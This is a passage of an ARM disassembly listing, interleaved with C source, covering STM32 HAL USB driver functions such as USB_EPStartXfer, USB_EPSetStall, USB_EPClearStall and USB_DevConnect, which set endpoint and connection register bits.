 8007f7e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f82:	801a      	strh	r2, [r3, #0]
 8007f84:	e030      	b.n	8007fe8 <USB_EPStartXfer+0x155e>
 8007f86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f8a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f8e:	681b      	ldr	r3, [r3, #0]
 8007f90:	785b      	ldrb	r3, [r3, #1]
 8007f92:	2b01      	cmp	r3, #1
 8007f94:	d128      	bne.n	8007fe8 <USB_EPStartXfer+0x155e>
 8007f96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f9a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f9e:	681b      	ldr	r3, [r3, #0]
 8007fa0:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007fa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fac:	681b      	ldr	r3, [r3, #0]
 8007fae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007fb2:	b29b      	uxth	r3, r3
 8007fb4:	461a      	mov	r2, r3
 8007fb6:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007fba:	4413      	add	r3, r2
 8007fbc:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007fc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fc4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fc8:	681b      	ldr	r3, [r3, #0]
 8007fca:	781b      	ldrb	r3, [r3, #0]
 8007fcc:	00da      	lsls	r2, r3, #3
 8007fce:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007fd2:	4413      	add	r3, r2
 8007fd4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007fd8:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007fdc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fe0:	b29a      	uxth	r2, r3
 8007fe2:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007fe6:	801a      	strh	r2, [r3, #0]
 8007fe8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ff0:	681b      	ldr	r3, [r3, #0]
 8007ff2:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007ff6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ffa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ffe:	681b      	ldr	r3, [r3, #0]
 8008000:	785b      	ldrb	r3, [r3, #1]
 8008002:	2b00      	cmp	r3, #0
 8008004:	f040 8085 	bne.w	8008112 <USB_EPStartXfer+0x1688>
 8008008:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800800c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008010:	681b      	ldr	r3, [r3, #0]
 8008012:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008016:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800801a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800801e:	681b      	ldr	r3, [r3, #0]
 8008020:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008024:	b29b      	uxth	r3, r3
 8008026:	461a      	mov	r2, r3
 8008028:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 800802c:	4413      	add	r3, r2
 800802e:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008032:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008036:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800803a:	681b      	ldr	r3, [r3, #0]
 800803c:	781b      	ldrb	r3, [r3, #0]
 800803e:	00da      	lsls	r2, r3, #3
 8008040:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008044:	4413      	add	r3, r2
 8008046:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800804a:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 800804e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008052:	881b      	ldrh	r3, [r3, #0]
 8008054:	b29b      	uxth	r3, r3
 8008056:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800805a:	b29a      	uxth	r2, r3
 800805c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008060:	801a      	strh	r2, [r3, #0]
 8008062:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008066:	2b3e      	cmp	r3, #62	; 0x3e
 8008068:	d923      	bls.n	80080b2 <USB_EPStartXfer+0x1628>
 800806a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800806e:	095b      	lsrs	r3, r3, #5
 8008070:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008074:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008078:	f003 031f 	and.w	r3, r3, #31
 800807c:	2b00      	cmp	r3, #0
 800807e:	d104      	bne.n	800808a <USB_EPStartXfer+0x1600>
 8008080:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008084:	3b01      	subs	r3, #1
 8008086:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800808a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800808e:	881b      	ldrh	r3, [r3, #0]
 8008090:	b29a      	uxth	r2, r3
 8008092:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008096:	b29b      	uxth	r3, r3
 8008098:	029b      	lsls	r3, r3, #10
 800809a:	b29b      	uxth	r3, r3
 800809c:	4313      	orrs	r3, r2
 800809e:	b29b      	uxth	r3, r3
 80080a0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80080a4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080a8:	b29a      	uxth	r2, r3
 80080aa:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080ae:	801a      	strh	r2, [r3, #0]
 80080b0:	e05c      	b.n	800816c <USB_EPStartXfer+0x16e2>
 80080b2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080b6:	2b00      	cmp	r3, #0
 80080b8:	d10c      	bne.n	80080d4 <USB_EPStartXfer+0x164a>
 80080ba:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080be:	881b      	ldrh	r3, [r3, #0]
 80080c0:	b29b      	uxth	r3, r3
 80080c2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80080c6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080ca:	b29a      	uxth	r2, r3
 80080cc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080d0:	801a      	strh	r2, [r3, #0]
 80080d2:	e04b      	b.n	800816c <USB_EPStartXfer+0x16e2>
 80080d4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080d8:	085b      	lsrs	r3, r3, #1
 80080da:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80080de:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080e2:	f003 0301 	and.w	r3, r3, #1
 80080e6:	2b00      	cmp	r3, #0
 80080e8:	d004      	beq.n	80080f4 <USB_EPStartXfer+0x166a>
 80080ea:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80080ee:	3301      	adds	r3, #1
 80080f0:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80080f4:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080f8:	881b      	ldrh	r3, [r3, #0]
 80080fa:	b29a      	uxth	r2, r3
 80080fc:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008100:	b29b      	uxth	r3, r3
 8008102:	029b      	lsls	r3, r3, #10
 8008104:	b29b      	uxth	r3, r3
 8008106:	4313      	orrs	r3, r2
 8008108:	b29a      	uxth	r2, r3
 800810a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800810e:	801a      	strh	r2, [r3, #0]
 8008110:	e02c      	b.n	800816c <USB_EPStartXfer+0x16e2>
 8008112:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008116:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800811a:	681b      	ldr	r3, [r3, #0]
 800811c:	785b      	ldrb	r3, [r3, #1]
 800811e:	2b01      	cmp	r3, #1
 8008120:	d124      	bne.n	800816c <USB_EPStartXfer+0x16e2>
 8008122:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008126:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800812a:	681b      	ldr	r3, [r3, #0]
 800812c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008130:	b29b      	uxth	r3, r3
 8008132:	461a      	mov	r2, r3
 8008134:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008138:	4413      	add	r3, r2
 800813a:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800813e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008142:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008146:	681b      	ldr	r3, [r3, #0]
 8008148:	781b      	ldrb	r3, [r3, #0]
 800814a:	00da      	lsls	r2, r3, #3
 800814c:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008150:	4413      	add	r3, r2
 8008152:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008156:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 800815a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800815e:	b29a      	uxth	r2, r3
 8008160:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008164:	801a      	strh	r2, [r3, #0]
 8008166:	e001      	b.n	800816c <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008168:	2301      	movs	r3, #1
 800816a:	e03a      	b.n	80081e2 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800816c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008170:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008174:	681a      	ldr	r2, [r3, #0]
 8008176:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800817a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800817e:	681b      	ldr	r3, [r3, #0]
 8008180:	781b      	ldrb	r3, [r3, #0]
 8008182:	009b      	lsls	r3, r3, #2
 8008184:	4413      	add	r3, r2
 8008186:	881b      	ldrh	r3, [r3, #0]
 8008188:	b29b      	uxth	r3, r3
 800818a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800818e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008192:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008196:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800819a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800819e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80081a2:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80081a6:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80081aa:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80081ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081b2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081b6:	681a      	ldr	r2, [r3, #0]
 80081b8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081bc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081c0:	681b      	ldr	r3, [r3, #0]
 80081c2:	781b      	ldrb	r3, [r3, #0]
 80081c4:	009b      	lsls	r3, r3, #2
 80081c6:	441a      	add	r2, r3
 80081c8:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80081cc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081d0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081d4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081d8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081dc:	b29b      	uxth	r3, r3
 80081de:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80081e0:	2300      	movs	r3, #0
}
 80081e2:	4618      	mov	r0, r3
 80081e4:	f507 7784 	add.w	r7, r7, #264	; 0x108
 80081e8:	46bd      	mov	sp, r7
 80081ea:	bd80      	pop	{r7, pc}

080081ec <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80081ec:	b480      	push	{r7}
 80081ee:	b085      	sub	sp, #20
 80081f0:	af00      	add	r7, sp, #0
 80081f2:	6078      	str	r0, [r7, #4]
 80081f4:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 80081f6:	683b      	ldr	r3, [r7, #0]
 80081f8:	785b      	ldrb	r3, [r3, #1]
 80081fa:	2b00      	cmp	r3, #0
 80081fc:	d020      	beq.n	8008240 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 80081fe:	687a      	ldr	r2, [r7, #4]
 8008200:	683b      	ldr	r3, [r7, #0]
 8008202:	781b      	ldrb	r3, [r3, #0]
 8008204:	009b      	lsls	r3, r3, #2
 8008206:	4413      	add	r3, r2
 8008208:	881b      	ldrh	r3, [r3, #0]
 800820a:	b29b      	uxth	r3, r3
 800820c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008210:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008214:	81bb      	strh	r3, [r7, #12]
 8008216:	89bb      	ldrh	r3, [r7, #12]
 8008218:	f083 0310 	eor.w	r3, r3, #16
 800821c:	81bb      	strh	r3, [r7, #12]
 800821e:	687a      	ldr	r2, [r7, #4]
 8008220:	683b      	ldr	r3, [r7, #0]
 8008222:	781b      	ldrb	r3, [r3, #0]
 8008224:	009b      	lsls	r3, r3, #2
 8008226:	441a      	add	r2, r3
 8008228:	89bb      	ldrh	r3, [r7, #12]
 800822a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800822e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008232:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008236:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800823a:	b29b      	uxth	r3, r3
 800823c:	8013      	strh	r3, [r2, #0]
 800823e:	e01f      	b.n	8008280 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 8008240:	687a      	ldr	r2, [r7, #4]
 8008242:	683b      	ldr	r3, [r7, #0]
 8008244:	781b      	ldrb	r3, [r3, #0]
 8008246:	009b      	lsls	r3, r3, #2
 8008248:	4413      	add	r3, r2
 800824a:	881b      	ldrh	r3, [r3, #0]
 800824c:	b29b      	uxth	r3, r3
 800824e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008252:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008256:	81fb      	strh	r3, [r7, #14]
 8008258:	89fb      	ldrh	r3, [r7, #14]
 800825a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800825e:	81fb      	strh	r3, [r7, #14]
 8008260:	687a      	ldr	r2, [r7, #4]
 8008262:	683b      	ldr	r3, [r7, #0]
 8008264:	781b      	ldrb	r3, [r3, #0]
 8008266:	009b      	lsls	r3, r3, #2
 8008268:	441a      	add	r2, r3
 800826a:	89fb      	ldrh	r3, [r7, #14]
 800826c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008270:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008274:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008278:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800827c:	b29b      	uxth	r3, r3
 800827e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008280:	2300      	movs	r3, #0
}
 8008282:	4618      	mov	r0, r3
 8008284:	3714      	adds	r7, #20
 8008286:	46bd      	mov	sp, r7
 8008288:	f85d 7b04 	ldr.w	r7, [sp], #4
 800828c:	4770      	bx	lr

0800828e <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800828e:	b480      	push	{r7}
 8008290:	b087      	sub	sp, #28
 8008292:	af00      	add	r7, sp, #0
 8008294:	6078      	str	r0, [r7, #4]
 8008296:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008298:	683b      	ldr	r3, [r7, #0]
 800829a:	7b1b      	ldrb	r3, [r3, #12]
 800829c:	2b00      	cmp	r3, #0
 800829e:	f040 809d 	bne.w	80083dc <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 80082a2:	683b      	ldr	r3, [r7, #0]
 80082a4:	785b      	ldrb	r3, [r3, #1]
 80082a6:	2b00      	cmp	r3, #0
 80082a8:	d04c      	beq.n	8008344 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80082aa:	687a      	ldr	r2, [r7, #4]
 80082ac:	683b      	ldr	r3, [r7, #0]
 80082ae:	781b      	ldrb	r3, [r3, #0]
 80082b0:	009b      	lsls	r3, r3, #2
 80082b2:	4413      	add	r3, r2
 80082b4:	881b      	ldrh	r3, [r3, #0]
 80082b6:	823b      	strh	r3, [r7, #16]
 80082b8:	8a3b      	ldrh	r3, [r7, #16]
 80082ba:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80082be:	2b00      	cmp	r3, #0
 80082c0:	d01b      	beq.n	80082fa <USB_EPClearStall+0x6c>
 80082c2:	687a      	ldr	r2, [r7, #4]
 80082c4:	683b      	ldr	r3, [r7, #0]
 80082c6:	781b      	ldrb	r3, [r3, #0]
 80082c8:	009b      	lsls	r3, r3, #2
 80082ca:	4413      	add	r3, r2
 80082cc:	881b      	ldrh	r3, [r3, #0]
 80082ce:	b29b      	uxth	r3, r3
 80082d0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082d4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80082d8:	81fb      	strh	r3, [r7, #14]
 80082da:	687a      	ldr	r2, [r7, #4]
 80082dc:	683b      	ldr	r3, [r7, #0]
 80082de:	781b      	ldrb	r3, [r3, #0]
 80082e0:	009b      	lsls	r3, r3, #2
 80082e2:	441a      	add	r2, r3
 80082e4:	89fb      	ldrh	r3, [r7, #14]
 80082e6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082ea:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082ee:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082f2:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80082f6:	b29b      	uxth	r3, r3
 80082f8:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80082fa:	683b      	ldr	r3, [r7, #0]
 80082fc:	78db      	ldrb	r3, [r3, #3]
 80082fe:	2b01      	cmp	r3, #1
 8008300:	d06c      	beq.n	80083dc <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8008302:	687a      	ldr	r2, [r7, #4]
 8008304:	683b      	ldr	r3, [r7, #0]
 8008306:	781b      	ldrb	r3, [r3, #0]
 8008308:	009b      	lsls	r3, r3, #2
 800830a:	4413      	add	r3, r2
 800830c:	881b      	ldrh	r3, [r3, #0]
 800830e:	b29b      	uxth	r3, r3
 8008310:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008314:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008318:	81bb      	strh	r3, [r7, #12]
 800831a:	89bb      	ldrh	r3, [r7, #12]
 800831c:	f083 0320 	eor.w	r3, r3, #32
 8008320:	81bb      	strh	r3, [r7, #12]
 8008322:	687a      	ldr	r2, [r7, #4]
 8008324:	683b      	ldr	r3, [r7, #0]
 8008326:	781b      	ldrb	r3, [r3, #0]
 8008328:	009b      	lsls	r3, r3, #2
 800832a:	441a      	add	r2, r3
 800832c:	89bb      	ldrh	r3, [r7, #12]
 800832e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008332:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008336:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800833a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800833e:	b29b      	uxth	r3, r3
 8008340:	8013      	strh	r3, [r2, #0]
 8008342:	e04b      	b.n	80083dc <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8008344:	687a      	ldr	r2, [r7, #4]
 8008346:	683b      	ldr	r3, [r7, #0]
 8008348:	781b      	ldrb	r3, [r3, #0]
 800834a:	009b      	lsls	r3, r3, #2
 800834c:	4413      	add	r3, r2
 800834e:	881b      	ldrh	r3, [r3, #0]
 8008350:	82fb      	strh	r3, [r7, #22]
 8008352:	8afb      	ldrh	r3, [r7, #22]
 8008354:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8008358:	2b00      	cmp	r3, #0
 800835a:	d01b      	beq.n	8008394 <USB_EPClearStall+0x106>
 800835c:	687a      	ldr	r2, [r7, #4]
 800835e:	683b      	ldr	r3, [r7, #0]
 8008360:	781b      	ldrb	r3, [r3, #0]
 8008362:	009b      	lsls	r3, r3, #2
 8008364:	4413      	add	r3, r2
 8008366:	881b      	ldrh	r3, [r3, #0]
 8008368:	b29b      	uxth	r3, r3
 800836a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800836e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008372:	82bb      	strh	r3, [r7, #20]
 8008374:	687a      	ldr	r2, [r7, #4]
 8008376:	683b      	ldr	r3, [r7, #0]
 8008378:	781b      	ldrb	r3, [r3, #0]
 800837a:	009b      	lsls	r3, r3, #2
 800837c:	441a      	add	r2, r3
 800837e:	8abb      	ldrh	r3, [r7, #20]
 8008380:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008384:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008388:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800838c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008390:	b29b      	uxth	r3, r3
 8008392:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008394:	687a      	ldr	r2, [r7, #4]
 8008396:	683b      	ldr	r3, [r7, #0]
 8008398:	781b      	ldrb	r3, [r3, #0]
 800839a:	009b      	lsls	r3, r3, #2
 800839c:	4413      	add	r3, r2
 800839e:	881b      	ldrh	r3, [r3, #0]
 80083a0:	b29b      	uxth	r3, r3
 80083a2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80083a6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80083aa:	827b      	strh	r3, [r7, #18]
 80083ac:	8a7b      	ldrh	r3, [r7, #18]
 80083ae:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80083b2:	827b      	strh	r3, [r7, #18]
 80083b4:	8a7b      	ldrh	r3, [r7, #18]
 80083b6:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80083ba:	827b      	strh	r3, [r7, #18]
 80083bc:	687a      	ldr	r2, [r7, #4]
 80083be:	683b      	ldr	r3, [r7, #0]
 80083c0:	781b      	ldrb	r3, [r3, #0]
 80083c2:	009b      	lsls	r3, r3, #2
 80083c4:	441a      	add	r2, r3
 80083c6:	8a7b      	ldrh	r3, [r7, #18]
 80083c8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083cc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083d0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083d4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083d8:	b29b      	uxth	r3, r3
 80083da:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 80083dc:	2300      	movs	r3, #0
}
 80083de:	4618      	mov	r0, r3
 80083e0:	371c      	adds	r7, #28
 80083e2:	46bd      	mov	sp, r7
 80083e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083e8:	4770      	bx	lr

080083ea <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 80083ea:	b480      	push	{r7}
 80083ec:	b083      	sub	sp, #12
 80083ee:	af00      	add	r7, sp, #0
 80083f0:	6078      	str	r0, [r7, #4]
 80083f2:	460b      	mov	r3, r1
 80083f4:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 80083f6:	78fb      	ldrb	r3, [r7, #3]
 80083f8:	2b00      	cmp	r3, #0
 80083fa:	d103      	bne.n	8008404 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 80083fc:	687b      	ldr	r3, [r7, #4]
 80083fe:	2280      	movs	r2, #128	; 0x80
 8008400:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008404:	2300      	movs	r3, #0
}
 8008406:	4618      	mov	r0, r3
 8008408:	370c      	adds	r7, #12
 800840a:	46bd      	mov	sp, r7
 800840c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008410:	4770      	bx	lr

08008412 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008412:	b480      	push	{r7}
 8008414:	b083      	sub	sp, #12
 8008416:	af00      	add	r7, sp, #0
 8008418:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800841a:	687b      	ldr	r3, [r7, #4]
 800841c:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008420:	b29b      	uxth	r3, r3
 8008422:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008426:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800842a:	b29a      	uxth	r2, r3
 800842c:	687b      	ldr	r3, [r7, #4]
 800842e:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008432:	2300      	movs	r3, #0
}
 8008434:	4618      	mov	r0, r3
 8008436:	370c      	adds	r7, #12
 8008438:	46bd      	mov	sp, r7
 800843a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800843e:	4770      	bx	lr

08008440 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 8008440:	b480      	push	{r7}
 8008442:	b083      	sub	sp, #12
 8008444:	af00      	add	r7, sp, #0
 8008446:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 8008448:	687b      	ldr	r3, [r7, #4]
 800844a:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 800844e:	b29b      	uxth	r3, r3
 8008450:	f3c3 030e 	ubfx	r3, r3, #0, #15
 8008454:	b29a      	uxth	r2, r3
 8008456:	687b      	ldr	r3, [r7, #4]
 8008458:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 800845c:	2300      	movs	r3, #0
}
 800845e:	4618      	mov	r0, r3
 8008460:	370c      	adds	r7, #12
 8008462:	46bd      	mov	sp, r7
 8008464:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008468:	4770      	bx	lr

0800846a <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 800846a:	b480      	push	{r7}
 800846c:	b085      	sub	sp, #20
 800846e:	af00      	add	r7, sp, #0
 8008470:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 8008472:	687b      	ldr	r3, [r7, #4]
 8008474:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008478:	b29b      	uxth	r3, r3
 800847a:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 800847c:	68fb      	ldr	r3, [r7, #12]
}
 800847e:	4618      	mov	r0, r3
 8008480:	3714      	adds	r7, #20
 8008482:	46bd      	mov	sp, r7
